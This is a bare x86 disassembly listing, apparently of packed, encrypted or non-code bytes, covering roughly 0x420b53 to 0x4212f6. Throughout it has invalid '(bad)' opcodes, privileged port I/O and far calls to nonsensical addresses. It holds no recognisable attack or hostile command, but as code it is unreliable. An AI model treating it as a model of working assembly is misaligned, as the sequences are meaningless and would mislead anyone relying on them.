  420b53:	jmp    0x62757a3e
  420b58:	pop    ecx
  420b59:	sar    DWORD PTR [edi+0x705b5a64],1
  420b5f:	push   edi
  420b60:	call   0x98238d81
  420b65:	int3   
  420b66:	mov    eax,ds:0xa2db95a8
  420b6b:	or     eax,0x93e121eb
  420b70:	inc    esp
  420b71:	cmp    BYTE PTR [ebp-0x3c58d29b],dh
  420b77:	nop
  420b78:	push   esi
  420b79:	inc    ecx
  420b7a:	xor    eax,0xcf044fea
  420b7f:	aaa    
  420b80:	jns    0x420b44
  420b82:	cmp    dl,ah
  420b84:	je     0x420b68
  420b86:	mov    BYTE PTR ds:0x3fb355c9,ah
  420b8c:	cmp    bh,BYTE PTR [edx-0x67]
  420b8f:	sub    eax,0x3312e09e
  420b94:	in     eax,dx
  420b95:	gs cli 
  420b97:	pusha  
  420b98:	repz and bl,dh
  420b9b:	jb     0x420bbb
  420b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b9e:	and    cl,0x1d
  420ba1:	or     cl,cl
  420ba3:	data16 jb 0x420b81
  420ba6:	cmp    al,0x20
  420ba8:	lock or DWORD PTR [esi+ecx*1-0x6f],esp
  420bad:	jmp    0x420baa
  420baf:	fcmovb st,st(1)
  420bb1:	xchg   ebp,eax
  420bb2:	ins    BYTE PTR es:[edi],dx
  420bb3:	fmul   st(3),st
  420bb5:	inc    eax
  420bb6:	xlat   BYTE PTR ds:[ebx]
  420bb7:	fidiv  DWORD PTR [edx+0x63739018]
  420bbd:	cwde   
  420bbe:	adc    DWORD PTR ds:0x53f91bb1,edx
  420bc4:	shr    BYTE PTR [ecx+0x5c],cl
  420bc7:	fidivr WORD PTR [edx]
  420bc9:	test   cl,0x50
  420bcc:	xchg   DWORD PTR [edi-0x295ac7e3],esi
  420bd2:	out    dx,eax
  420bd3:	jle    0x420c1c
  420bd5:	adc    eax,0x69a11e56
  420bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bdb:	jge    0x420bf4
  420bdd:	sbb    DWORD PTR [edi],esi
  420bdf:	xor    ch,dh
  420be1:	cld    
  420be2:	pop    ebx
  420be3:	push   esp
  420be4:	in     eax,0xb0
  420be6:	mov    eax,ds:0x1c14b33d
  420beb:	lods   al,BYTE PTR ds:[esi]
  420bec:	sbb    BYTE PTR [ebp-0x742011c5],bh
  420bf2:	jae    0x420bd3
  420bf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bf5:	loope  0x420c66
  420bf7:	pop    esi
  420bf8:	aad    0xe8
  420bfa:	inc    eax
  420bfb:	jbe    0x420c58
  420bfd:	scas   eax,DWORD PTR es:[edi]
  420bfe:	dec    eax
  420bff:	pop    edi
  420c00:	mov    ?,WORD PTR [ecx-0x76811d50]
  420c06:	aaa    
  420c07:	mov    ch,0x86
  420c09:	cmc    
  420c0a:	in     al,dx
  420c0b:	(bad)  
  420c0c:	xchg   ebp,eax
  420c0d:	pop    eax
  420c0e:	push   edi
  420c0f:	mov    dh,0xe1
  420c11:	idiv   DWORD PTR [ebp+0x21]
  420c14:	xor    al,bh
  420c16:	nop
  420c17:	outs   dx,DWORD PTR ds:[esi]
  420c18:	jmp    0x420bac
  420c1a:	daa    
  420c1b:	add    dl,0x62
  420c1e:	ret    0xe16
  420c21:	xchg   ecx,eax
  420c22:	(bad)  
  420c23:	cld    
  420c24:	imul   esp,DWORD PTR [ebx],0xffffff94
  420c27:	not    DWORD PTR [esi+0x1006136a]
  420c2d:	dec    esp
  420c2e:	push   edx
  420c2f:	cld    
  420c30:	arpl   WORD PTR [esp+eax*4-0x617409ce],si
  420c37:	add    al,al
  420c39:	jbe    0x420bf6
  420c3b:	cmp    edx,DWORD PTR [eax+0x4c8fb5a0]
  420c41:	aaa    
  420c42:	cmp    al,0xd3
  420c44:	push   0xffffffdc
  420c46:	xchg   ecx,eax
  420c47:	cmc    
  420c48:	inc    edi
  420c49:	adc    eax,0xb5c2ffca
  420c4e:	sub    al,0x51
  420c50:	out    dx,eax
  420c51:	inc    esi
  420c52:	fidiv  DWORD PTR [eax-0x3bac821c]
  420c58:	ds cmp al,0xae
  420c5b:	call   0x135e:0x4bf7d5ec
  420c62:	adc    dh,BYTE PTR [ebx+0x61]
  420c65:	sub    al,BYTE PTR [ecx-0x5e]
  420c68:	inc    ebx
  420c69:	cmp    cl,0xd
  420c6c:	push   ds
  420c6d:	adc    bl,BYTE PTR cs:[ebp+0x46ddcd2f]
  420c74:	enter  0x788b,0x1c
  420c78:	jne    0x420c2a
  420c7a:	push   0xffffffab
  420c7c:	repnz test DWORD PTR [ebp+0x7373a032],ebx
  420c83:	push   ecx
  420c84:	pop    ebp
  420c85:	mov    gs,WORD PTR [ecx+0x19]
  420c88:	mov    edi,0xb39e98ba
  420c8d:	adc    BYTE PTR [edi+ecx*4+0x785d2e93],cl
  420c94:	mov    esp,0x786086ac
  420c99:	data16 ja 0x420cd6
  420c9c:	clc    
  420c9d:	fs aaa 
  420c9f:	xor    eax,DWORD PTR [ebx]
  420ca1:	or     DWORD PTR [edi+0xb],ebx
  420ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ca5:	fiadd  DWORD PTR [eax]
  420ca7:	in     eax,dx
  420ca8:	add    al,0x79
  420caa:	mov    cl,0xd6
  420cac:	mov    esp,0x480dec6
  420cb1:	xchg   esi,eax
  420cb2:	jns    0x420c7c
  420cb4:	lea    ebx,[ebp-0x68]
  420cb7:	shr    BYTE PTR [eax+0x476b0059],0xc0
  420cbe:	sub    eax,0xb56d4d9f
  420cc3:	stos   BYTE PTR es:[edi],al
  420cc4:	pop    ecx
  420cc5:	aad    0xe0
  420cc7:	sbb    DWORD PTR [eax],ebx
  420cc9:	fild   WORD PTR [edx+ebx*2]
  420ccc:	arpl   bp,dx
  420cce:	mov    esp,DWORD PTR [ebx]
  420cd0:	adc    DWORD PTR [ebx+0x2b],0x6d0c8a22
  420cd7:	mul    BYTE PTR [esi-0x22]
  420cda:	push   esi
  420cdb:	add    ebx,edx
  420cdd:	jmp    FWORD PTR [ebp-0x63585450]
  420ce3:	jbe    0x420d3a
  420ce5:	sub    BYTE PTR [bp+di+0x4b],bl
  420ce9:	adc    DWORD PTR ds:0x147567e7,ebx
  420cef:	mov    dl,0xb5
  420cf1:	and    eax,0x98fd052d
  420cf6:	inc    eax
  420cf7:	mov    eax,DWORD PTR [ecx-0x5221e944]
  420cfd:	add    cl,BYTE PTR [eax+0x35]
  420d00:	push   ds
  420d01:	ror    BYTE PTR ds:0x7a0c7d58,1
  420d07:	popf   
  420d08:	imul   esi,DWORD PTR [edx],0xe087c63a
  420d0e:	jmp    0xb608a4cd
  420d13:	imul   ecx,DWORD PTR [edx],0xffffff89
  420d16:	and    esi,DWORD PTR [edx]
  420d18:	pop    esi
  420d19:	mov    cl,0xc3
  420d1b:	push   edx
  420d1c:	sub    al,0x88
  420d1e:	test   dh,bl
  420d20:	jbe    0x420d73
  420d22:	jno    0x420d2c
  420d24:	stos   DWORD PTR es:[edi],eax
  420d25:	add    eax,0xdcbb74b4
  420d2a:	push   ebp
  420d2b:	retf   
  420d2c:	popf   
  420d2d:	cli    
  420d2e:	out    dx,eax
  420d2f:	loop   0x420d09
  420d31:	mov    eax,DWORD PTR [edi+edx*4]
  420d34:	mov    ?,WORD PTR [ebx+0xe]
  420d37:	neg    DWORD PTR [edx]
  420d39:	sbb    eax,0xf6559cc8
  420d3e:	sbb    eax,DWORD PTR [edx+eiz*4+0x7c9d940f]
  420d45:	add    esi,0x8ff73266
  420d4b:	fdivr  DWORD PTR [ecx-0xd2bf70a]
  420d51:	shr    edx,cl
  420d53:	je     0x420cf9
  420d55:	shl    DWORD PTR [eax+0x5e8590ec],0xf1
  420d5c:	fmul   DWORD PTR [ecx]
  420d5e:	xor    DWORD PTR [eax+edi*1+0x12],ebx
  420d62:	add    al,0x20
  420d64:	retf   0x2153
  420d67:	loopne 0x420de8
  420d69:	xor    esp,eax
  420d6b:	gs pop ss
  420d6d:	lea    esi,[ecx+0x32]
  420d70:	inc    esp
  420d71:	adc    sp,sp
  420d74:	pop    ebx
  420d75:	cli    
  420d76:	inc    esi
  420d77:	push   ss
  420d78:	(bad)  
  420d79:	(bad)  [edx-0x340a15cf]
  420d7f:	mov    ch,0xd7
  420d81:	enter  0x55f4,0x62
  420d85:	mov    dh,0xbd
  420d87:	xchg   edx,edx
  420d89:	xor    DWORD PTR [edi-0x61e059f3],esp
  420d8f:	das    
  420d90:	test   bh,ch
  420d92:	pop    esp
  420d93:	and    dl,ch
  420d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d96:	xchg   esi,eax
  420d97:	jecxz  0x420da9
  420d99:	adc    DWORD PTR [esi-0x27],esi
  420d9c:	fmul   DWORD PTR [edx+0x12c0d56e]
  420da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420da3:	xor    BYTE PTR [ebx-0x6c],ah
  420da6:	add    cl,dh
  420da8:	xchg   DWORD PTR [ebx+0x2f],esi
  420dab:	into   
  420dac:	xchg   esi,eax
  420dad:	jp     0x420d8e
  420daf:	jg     0x420da3
  420db1:	fisubr DWORD PTR [ebp-0x1814bc5e]
  420db7:	mov    edi,0x11ac19cb
  420dbc:	lea    esi,[edx+0x34]
  420dbf:	popa   
  420dc0:	dec    ecx
  420dc1:	add    bh,cl
  420dc3:	std    
  420dc4:	adc    BYTE PTR [ebp+0xbbbd413],bl
  420dca:	mov    ebx,0xbb159c39
  420dcf:	sub    cl,BYTE PTR [eax]
  420dd1:	hlt    
  420dd2:	in     eax,dx
  420dd3:	add    dl,BYTE PTR [edx-0x33]
  420dd6:	dec    edx
  420dd7:	test   eax,0x3a2fffc6
  420ddc:	sahf   
  420ddd:	jb     0x420d83
  420ddf:	es mov cl,0x64
  420de2:	(bad)
  420de5:	mov    edx,0xa6cfca93
  420dea:	into   
  420deb:	pop    edx
  420dec:	adc    eax,0x27ab71de
  420df1:	faddp  st(3),st
  420df3:	and    BYTE PTR [eax+0x6a],al
  420df6:	push   ss
  420df7:	pop    ecx
  420df8:	xor    ebp,DWORD PTR [edi]
  420dfa:	mov    dh,0x91
  420dfc:	loope  0x420deb
  420dfe:	shl    dl,0x97
  420e01:	fcmovu st,st(4)
  420e03:	dec    eax
  420e04:	fisub  DWORD PTR [ecx]
  420e06:	xlat   BYTE PTR ds:[ebx]
  420e07:	jmp    0x5bd7:0x5c6dfbb9
  420e0e:	lods   eax,DWORD PTR ds:[esi]
  420e0f:	popa   
  420e10:	jnp    0x420dfa
  420e12:	jecxz  0x420da5
  420e14:	jp     0x420e5e
  420e16:	stos   DWORD PTR es:[edi],eax
  420e17:	dec    eax
  420e18:	mov    esp,0x6c6e70fe
  420e1d:	icebp  
  420e1e:	data16 mov al,0x54
  420e21:	jns    0x420e58
  420e23:	push   ebx
  420e24:	mov    WORD PTR gs:[edi+0x2898300f],?
  420e2b:	inc    esp
  420e2c:	inc    edx
  420e2d:	dec    esp
  420e2e:	scas   eax,DWORD PTR es:[edi]
  420e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e30:	ins    DWORD PTR es:[edi],dx
  420e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e32:	jno    0x420dcd
  420e34:	cmp    eax,0x53c5a1c0
  420e39:	rol    BYTE PTR es:[ebx+esi*4],cl
  420e3d:	sahf   
  420e3e:	add    ebx,DWORD PTR [ebx-0x74]
  420e41:	cmp    ah,BYTE PTR [ebp-0x69cc5150]
  420e47:	call   0x928c:0xd0d3253f
  420e4e:	mov    edx,0xd1609a55
  420e53:	and    bh,BYTE PTR [edx-0x76a2b024]
  420e59:	or     BYTE PTR [ebp+0x4c],0x58
  420e5d:	xchg   esi,eax
  420e5e:	cld    
  420e5f:	xchg   BYTE PTR [esi-0x4422e799],bl
  420e65:	scas   al,BYTE PTR es:[edi]
  420e66:	call   0xbdc2cbbd
  420e6b:	out    0x70,eax
  420e6d:	xchg   DWORD PTR [ecx+0x28f3b2c6],edx
  420e73:	dec    ecx
  420e74:	mov    esp,0xd508d2c9
  420e79:	in     al,dx
  420e7a:	sbb    DWORD PTR [ecx-0x2c],edi
  420e7d:	jb     0x420ea6
  420e7f:	mov    edx,0xcd0b6d3c
  420e84:	push   edx
  420e85:	rcr    BYTE PTR [ebp+0x5a],1
  420e88:	syscall 
  420e8a:	add    al,0xfc
  420e8c:	(bad)
  420e8f:	mov    al,cl
  420e91:	fdiv   QWORD PTR [esi+0x30]
  420e94:	fild   DWORD PTR [ebx]
  420e96:	jns    0x420eb3
  420e98:	dec    ebx
  420e99:	outs   dx,BYTE PTR ds:[esi]
  420e9a:	adc    ebx,DWORD PTR [eax-0x5c]
  420e9d:	push   ebx
  420e9e:	and    al,BYTE PTR [eax]
  420ea0:	fsub   DWORD PTR [ecx-0x3b]
  420ea3:	in     eax,0x2
  420ea5:	dec    ebx
  420ea6:	int    0x6b
  420ea8:	lds    esi,FWORD PTR [ebx+0x31]
  420eab:	xchg   BYTE PTR [ebp-0x38aceeb7],ch
  420eb1:	and    ebx,DWORD PTR [edi]
  420eb3:	push   ebp
  420eb4:	imul   edi,ebx,0xcfc02af5
  420eba:	jne    0x420edb
  420ebc:	dec    esp
  420ebd:	repnz mov bh,0x88
  420ec0:	stos   BYTE PTR es:[edi],al
  420ec1:	pop    ebx
  420ec2:	mov    bh,0x32
  420ec4:	(bad)  
  420ec6:	add    DWORD PTR [esi],edx
  420ec8:	leave  
  420ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eca:	loop   0x420f14
  420ecc:	in     eax,dx
  420ecd:	ss andnps xmm4,xmm6
  420ed1:	out    dx,al
  420ed2:	cmp    BYTE PTR [edi-0x54],dh
  420ed5:	and    BYTE PTR [eax+0x39a58220],cl
  420edb:	shl    edi,0x32
  420ede:	jno    0x420f1b
  420ee0:	stos   BYTE PTR es:[edi],al
  420ee1:	and    ecx,DWORD PTR [ebx+0x47685609]
  420ee7:	sub    ch,BYTE PTR es:[edi+0x7e]
  420eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eec:	xchg   esi,eax
  420eed:	ja     0x420ed6
  420eef:	aas    
  420ef0:	(bad)  [edx-0x4d836bfc]
  420ef6:	cmp    al,0x96
  420ef8:	test   eax,0x2ba41b9
  420efd:	aam    0x42
  420eff:	xor    dh,dl
  420f01:	mov    cl,0xb6
  420f03:	dec    ecx
  420f04:	idiv   ecx
  420f06:	mov    al,ds:0x8460154e
  420f0b:	repnz push edi
  420f0d:	and    BYTE PTR [edi-0x2d],dh
  420f10:	xchg   ebx,eax
  420f11:	sub    ch,BYTE PTR [esi+0x32]
  420f14:	jbe    0x420f02
  420f16:	loopne 0x420f72
  420f18:	push   cs
  420f19:	mov    eax,DWORD PTR [edi-0x2d]
  420f1c:	jne    0x420f95
  420f1e:	aad    0x3f
  420f20:	xor    al,0xab
  420f22:	loope  0x420eff
  420f24:	mov    esp,0x78754fac
  420f29:	pop    ecx
  420f2a:	mov    esp,0x45b77a75
  420f2f:	fs pop ss
  420f31:	es mov bh,0x3f
  420f34:	mov    bh,0x48
  420f36:	add    bl,bh
  420f38:	mov    esp,0xe038dd21
  420f3d:	or     bh,BYTE PTR ss:[ebx]
  420f40:	shl    DWORD PTR [edi+0x10dc3058],0xdb
  420f47:	outs   dx,DWORD PTR ds:[esi]
  420f48:	mov    ds:0xda73e79,eax
  420f4d:	lods   eax,DWORD PTR ds:[esi]
  420f4e:	xor    al,0x80
  420f50:	pop    eax
  420f51:	dec    ecx
  420f52:	push   cs
  420f53:	sbb    DWORD PTR ds:0x489789d0,0xfffffffd
  420f5a:	test   eax,0xd4077d82
  420f5f:	pusha  
  420f60:	jg     0x420f01
  420f62:	aam    0xb1
  420f64:	and    eax,0xe466e7ad
  420f69:	(bad)  
  420f6a:	jne    0x420f0e
  420f6c:	retf   0x2d08
  420f6f:	sbb    esp,DWORD PTR [esi-0x62aee7d8]
  420f75:	test   BYTE PTR [eax+0x788a98a5],ch
  420f7b:	retf   
  420f7c:	sub    BYTE PTR fs:[ecx],bh
  420f7f:	xchg   ebx,eax
  420f80:	call   0x30a6:0xc6f46e2d
  420f87:	dec    ecx
  420f88:	popf   
  420f89:	ficom  DWORD PTR [ebx+0x4a5c7daa]
  420f8f:	cmp    al,0x4b
  420f91:	scas   al,BYTE PTR es:[edi]
  420f92:	das    
  420f93:	test   ch,dl
  420f95:	or     BYTE PTR [eax-0x79f4a4ae],ch
  420f9b:	loopne 0x420fa7
  420f9d:	mov    ebp,0xa0ed0c47
  420fa2:	data16 xchg BYTE PTR [eax+0x74],dh
  420fa6:	inc    ecx
  420fa7:	ds push esi
  420fa9:	inc    ecx
  420faa:	imul   ecx,DWORD PTR [ebp-0xcf02577],0xffffff87
  420fb1:	fs loopne 0x420fa5
  420fb4:	xchg   ebp,eax
  420fb5:	adc    eax,0xfdecaa48
  420fba:	push   es
  420fbb:	(bad)  
  420fbc:	icebp  
  420fbd:	mov    cl,0x6a
  420fbf:	les    edx,FWORD PTR [esi-0x66]
  420fc2:	stos   BYTE PTR es:[edi],al
  420fc3:	pop    edx
  420fc4:	mov    ecx,DWORD PTR [eax-0x43d22a1c]
  420fca:	stos   DWORD PTR es:[edi],eax
  420fcb:	lods   eax,DWORD PTR ds:[esi]
  420fcc:	and    BYTE PTR [eax-0x7e],ah
  420fcf:	(bad)  
  420fd0:	neg    eax
  420fd2:	out    0x2f,al
  420fd4:	adc    BYTE PTR [bx+di+0x1e],0x5a
  420fd9:	call   0xde9e1cb3
  420fde:	les    edx,FWORD PTR [ebx+eax*8+0x28]
  420fe2:	cmp    DWORD PTR [ebx],edx
  420fe4:	ret    
  420fe5:	fdivr  QWORD PTR [ebx+0x7e]
  420fe8:	aaa    
  420fe9:	call   0xb057358f
  420fee:	add    eax,0x4df79b17
  420ff3:	xchg   esp,eax
  420ff4:	bound  eax,QWORD PTR ds:0x44cac5f5
  420ffa:	fsubr  DWORD PTR [edi-0x2d]
  420ffd:	jnp    0x420f93
  420fff:	sub    ch,BYTE PTR [ebx-0x26]
  421002:	xor    DWORD PTR [eax],eax
  421004:	mov    eax,0x7097c368
  421009:	call   0xe5b3:0x70297346
  421010:	idiv   DWORD PTR gs:[ecx]
  421013:	jl     0x420fc9
  421015:	div    DWORD PTR [ebp-0x24]
  421018:	and    BYTE PTR [ebx],al
  42101a:	or     DWORD PTR [ebp+0x6ed58fea],ebp
  421020:	aas    
  421021:	not    BYTE PTR [esi+0x7e]
  421024:	pop    esp
  421025:	push   edi
  421026:	jmp    0x9151abdb
  42102b:	dec    ebp
  42102c:	or     edx,DWORD PTR [edi]
  42102e:	xor    cl,dh
  421030:	lds    edi,FWORD PTR fs:[ecx+ebp*2]
  421034:	in     al,0xc
  421036:	inc    ebp
  421037:	fld    QWORD PTR [esi]
  421039:	jnp    0x42100f
  42103b:	shl    BYTE PTR [eax],0x7
  42103e:	and    DWORD PTR [edx],ebp
  421040:	adc    eax,0xcb320799
  421045:	jl     0x421087
  421047:	adc    al,0x21
  421049:	in     eax,0x4e
  42104b:	mov    bl,0x8c
  42104d:	jo     0x420fd0
  42104f:	pop    ebp
  421050:	inc    eax
  421051:	inc    edi
  421052:	test   BYTE PTR [ebx+0x2b25bbca],bl
  421058:	jg     0x42107d
  42105a:	ins    DWORD PTR es:[edi],dx
  42105b:	dec    esi
  42105c:	stos   DWORD PTR es:[edi],eax
  42105d:	cdq    
  42105e:	jmp    0x420ff6
  421060:	inc    edi
  421061:	xchg   dl,cl
  421063:	pop    ecx
  421064:	psrld  mm2,mm5
  421067:	push   ecx
  421068:	cwde   
  421069:	push   esp
  42106a:	scas   al,BYTE PTR es:[edi]
  42106b:	stos   DWORD PTR es:[edi],eax
  42106c:	imul   eax,DWORD PTR [eax-0x72],0xffffffad
  421070:	push   0x50779936
  421075:	push   0xba885227
  42107a:	arpl   WORD PTR [edi+0x54790bb3],dx
  421080:	adc    BYTE PTR [edx-0x191007c0],bl
  421086:	xor    al,0x2d
  421088:	nop
  421089:	mov    esi,0xbf863d4f
  42108e:	cli    
  42108f:	cmp    DWORD PTR [ecx-0x71],0xffffffab
  421093:	pop    esp
  421094:	xor    ebx,ebx
  421096:	pop    ebx
  421097:	sub    al,0xb0
  421099:	aad    0x52
  42109b:	sbb    ebx,DWORD PTR [ecx+0x34]
  42109e:	cld    
  42109f:	mov    edx,ds
  4210a1:	aaa    
  4210a2:	mov    al,ds:0x65f68c57
  4210a7:	or     edi,ecx
  4210a9:	mov    ds:0x923c9923,al
  4210ae:	loope  0x42110d
  4210b0:	ins    BYTE PTR es:[edi],dx
  4210b1:	fadd   QWORD PTR [edx-0x7aad2fbb]
  4210b7:	jle    0x42103d
  4210b9:	inc    ebp
  4210ba:	add    edi,DWORD PTR [esi+ecx*8-0x77162404]
  4210c1:	fadd   st,st(0)
  4210c3:	mov    al,0x3
  4210c5:	jg     0x421054
  4210c7:	mov    edx,?
  4210c9:	ret    
  4210ca:	stos   DWORD PTR es:[di],eax
  4210cc:	fst    QWORD PTR [ebx-0x33e05243]
  4210d2:	cli    
  4210d3:	not    BYTE PTR [bp+di-0x35]
  4210d7:	adc    al,0x9e
  4210d9:	adc    ecx,DWORD PTR [edx+0x7b]
  4210dc:	inc    eax
  4210dd:	scas   al,BYTE PTR es:[edi]
  4210de:	and    ebx,DWORD PTR [edi-0x20]
  4210e1:	(bad)  
  4210e2:	sub    DWORD PTR [esi+ebp*1-0x43],ebp
  4210e6:	cmp    bh,BYTE PTR [esi+0x4cbfa8c3]
  4210ec:	cdq    
  4210ed:	ss test eax,0xd91845fb
  4210f3:	jno    0x4210c3
  4210f5:	push   es
  4210f6:	pop    esp
  4210f7:	icebp  
  4210f8:	popf   
  4210f9:	gs fwait
  4210fb:	data16 add BYTE PTR [esi-0x1b],bh
  4210ff:	xchg   eax,edx
  421101:	scas   eax,DWORD PTR es:[edi]
  421102:	mov    bl,0x64
  421104:	scas   al,BYTE PTR es:[edi]
  421105:	sbb    eax,0x7248296d
  42110a:	adc    ecx,eax
  42110c:	mov    dh,dh
  42110e:	pop    ebx
  42110f:	and    eax,DWORD PTR [edx+0x4995cfd7]
  421115:	pop    esi
  421116:	(bad)  
  421117:	clc    
  421118:	popa   
  421119:	cli    
  42111a:	fwait
  42111b:	cmp    BYTE PTR [esi-0x6c],al
  42111e:	scas   eax,DWORD PTR es:[edi]
  42111f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421120:	sbb    BYTE PTR [ebx-0x55509f0c],ah
  421126:	and    esi,ecx
  421128:	lea    ebp,ds:0x4e6f01be
  42112e:	mov    eax,ds:0xd4496a4c
  421133:	xlat   BYTE PTR ds:[ebx]
  421134:	retf   0x90db
  421137:	and    BYTE PTR [ecx],ah
  421139:	lock fidivr WORD PTR [ecx+0x76d78e4f]
  421140:	inc    ebp
  421141:	cmp    eax,0x24d72b07
  421146:	add    BYTE PTR [esp+esi*4],ch
  421149:	pop    ds
  42114a:	xchg   edx,eax
  42114b:	and    BYTE PTR [edx],dl
  42114d:	test   DWORD PTR ds:0xd7032ed3,edi
  421153:	sub    al,0x48
  421155:	dec    esp
  421156:	idiv   BYTE PTR [eax]
  421158:	adc    cl,ch
  42115a:	(bad)  [edx+esi*1-0x4]
  42115e:	cmc    
  42115f:	mov    ds:0xb9770b27,eax
  421164:	ret    0xbc7d
  421167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421168:	loopne 0x42114d
  42116a:	push   cs
  42116b:	push   esp
  42116c:	add    ah,ah
  42116e:	pop    es
  42116f:	sahf   
  421170:	popf   
  421171:	xchg   ebx,eax
  421172:	stc    
  421173:	jle    0x421141
  421175:	mov    dl,0x57
  421177:	add    ebx,edx
  421179:	jmp    0x88c1fb81
  42117e:	hlt    
  42117f:	xor    bh,BYTE PTR [edx-0x5e49d9a2]
  421185:	mov    eax,?
  421187:	push   edx
  421188:	aam    0x60
  42118a:	xchg   esp,eax
  42118b:	or     eax,0xfc4fa227
  421190:	push   esi
  421191:	and    al,0xd
  421193:	pop    edi
  421194:	mov    ecx,?
  421196:	aad    0x40
  421198:	les    esi,FWORD PTR [ebx]
  42119a:	push   ebp
  42119b:	stos   DWORD PTR es:[edi],eax
  42119c:	xor    DWORD PTR [edi+0x5b20c9a9],ebx
  4211a2:	lods   eax,DWORD PTR ds:[esi]
  4211a3:	mov    ah,0xf7
  4211a5:	(bad)  
  4211a6:	mov    edx,cs
  4211a8:	jae    0x421229
  4211aa:	fild   QWORD PTR [ecx+0x68c7c97f]
  4211b0:	push   edx
  4211b1:	or     esi,esi
  4211b3:	sub    al,BYTE PTR [ebx+0x3a]
  4211b6:	cli    
  4211b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211b8:	xchg   DWORD PTR [edi],ebp
  4211ba:	aam    0xb1
  4211bc:	(bad)  
  4211bd:	repz mov ds:0x924ec31d,eax
  4211c3:	ds jo  0x42119e
  4211c6:	cmp    dl,BYTE PTR [edi+0xbd24588]
  4211cc:	iret   
  4211cd:	mov    edi,0x4182c950
  4211d2:	rcr    BYTE PTR ds:0x9fadd082,0x4a
  4211d9:	jg     0x421233
  4211db:	xor    ch,BYTE PTR [esi+0x3f]
  4211de:	ret    0xa5af
  4211e1:	popa   
  4211e2:	imul   BYTE PTR [eax+0x67b5059f]
  4211e8:	inc    ecx
  4211e9:	sub    bl,BYTE PTR [edi-0x65a4d053]
  4211ef:	xor    edi,DWORD PTR [edx*1+0x4cae0b4e]
  4211f6:	(bad)  
  4211f7:	rol    DWORD PTR [ebp+0x5],cl
  4211fa:	int3   
  4211fb:	adc    dl,BYTE PTR [eax]
  4211fd:	push   ds
  4211fe:	addr16 xchg ebp,eax
  421200:	jns    0x4211cf
  421202:	jmp    0x5ce3e4bc
  421207:	xchg   ecx,eax
  421208:	mov    dl,0x67
  42120a:	add    eax,ebx
  42120c:	out    0xb0,eax
  42120e:	scas   eax,DWORD PTR es:[edi]
  42120f:	and    al,BYTE PTR [eax]
  421211:	sbb    al,0x16
  421213:	jmp    0xf03f:0x97df64d0
  42121a:	and    ebx,DWORD PTR [eax-0x74]
  42121d:	sub    al,0xe9
  42121f:	aaa    
  421220:	mov    gs,WORD PTR [edx+edx*4+0x30]
  421224:	mov    BYTE PTR [edx-0x21],dh
  421227:	cmp    eax,0x3c81230
  42122c:	xor    al,0xa3
  42122e:	rcr    DWORD PTR [edx],cl
  421230:	xchg   ecx,eax
  421231:	shl    eax,cl
  421233:	jns    0x42126d
  421235:	scas   eax,DWORD PTR es:[edi]
  421236:	stc    
  421237:	lock dec esi
  421239:	jb     0x421254
  42123b:	(bad)  
  42123c:	ins    DWORD PTR es:[edi],dx
  42123d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42123e:	jo     0x42125c
  421240:	push   esi
  421241:	into   
  421242:	inc    ecx
  421243:	adc    DWORD PTR cs:[ebx],edx
  421246:	pop    esp
  421247:	ds and al,0xf4
  42124a:	popf   
  42124b:	xchg   edx,eax
  42124c:	push   esp
  42124d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42124e:	retf   0xe54b
  421251:	stos   DWORD PTR es:[edi],eax
  421252:	sub    DWORD PTR [edx-0x582cc8dc],ecx
  421258:	addr16 mov eax,ds:0x2ee1
  42125c:	sub    eax,DWORD PTR [eax]
  42125e:	loop   0x421275
  421260:	call   0xfc721ec0
  421265:	outs   dx,BYTE PTR ds:[esi]
  421266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421267:	jl     0x4212b6
  421269:	stc    
  42126a:	jmp    0x21bbcaf1
  42126f:	adc    ecx,DWORD PTR [esi-0x688c0eb8]
  421275:	cdq    
  421276:	call   0x120a:0x6707f30c
  42127d:	loopne 0x4212a4
  42127f:	jge    0x4212d9
  421281:	in     eax,0x51
  421283:	sbb    edi,DWORD PTR [ebx-0x3d883fc4]
  421289:	call   0x6a32:0xbd5408b7
  421290:	loope  0x4212b5
  421292:	clc    
  421293:	(bad)  
  421294:	out    dx,eax
  421295:	xchg   ebp,eax
  421296:	mov    BYTE PTR [ebx+0x266736a1],dh
  42129c:	out    0x6e,al
  42129e:	ss pop es
  4212a0:	pop    es
  4212a1:	sub    eax,0xd01a2e71
  4212a6:	aas    
  4212a7:	into   
  4212a8:	lods   eax,DWORD PTR ds:[esi]
  4212a9:	add    esi,DWORD PTR [esi+0x33]
  4212ac:	add    al,0xcf
  4212ae:	xor    al,0xa1
  4212b0:	int    0x30
  4212b2:	inc    ebx
  4212b3:	lock mov edi,DWORD PTR [ebx]
  4212b6:	xchg   ebx,eax
  4212b7:	enter  0x55a5,0x3
  4212bb:	(bad)  
  4212bc:	sub    eax,0x8b48da2e
  4212c1:	pminub mm7,QWORD PTR ds:0x19eeba68
  4212c8:	repnz dec eax
  4212ca:	push   cs
  4212cb:	xchg   ebx,eax
  4212cc:	jg     0x42132f
  4212ce:	pop    ebx
  4212cf:	retf   0x7073
  4212d2:	fdiv   QWORD PTR [ebx+0x2c]
  4212d5:	inc    edi
  4212d6:	add    eax,0x99927c6f
  4212db:	mov    esi,DWORD PTR [ebx+edx*8-0x55]
  4212df:	dec    edx
  4212e0:	mov    esi,edx
  4212e2:	or     DWORD PTR [edx],eax
  4212e4:	(bad)  
  4212e5:	jns    0x4212ce
  4212e7:	add    al,0xb6
  4212e9:	inc    esi
  4212ea:	mov    dl,0x13
  4212ec:	out    0xe4,al
  4212ee:	or     bh,ah
  4212f0:	je     0x42132c
  4212f2:	dec    esi
  4212f3:	push   ds
  4212f4:	mov    bh,0xf7
  4212f6:	dec    edx
